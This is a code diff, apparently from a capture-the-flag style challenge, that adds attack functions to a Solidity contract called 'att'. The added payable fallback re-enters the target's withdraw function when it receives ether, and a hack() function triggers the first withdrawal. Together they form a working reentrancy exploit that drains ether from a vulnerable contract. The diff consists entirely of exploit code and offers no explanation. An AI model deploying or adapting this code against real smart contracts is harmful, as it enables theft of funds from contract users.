@@ -49,5 +49,14 @@ contract att {
     a.donate.value(1 ether)(this);
   }
 
-  
+  function() payable{
+    if (have_withdraw == 0 && msg.sender == instance_address){
+      have_withdraw = 1;
+      a.withdraw(1 ether);
+    }
+  }
+    
+  function hack(){
+    a.withdraw(1 ether);
+  }
 }
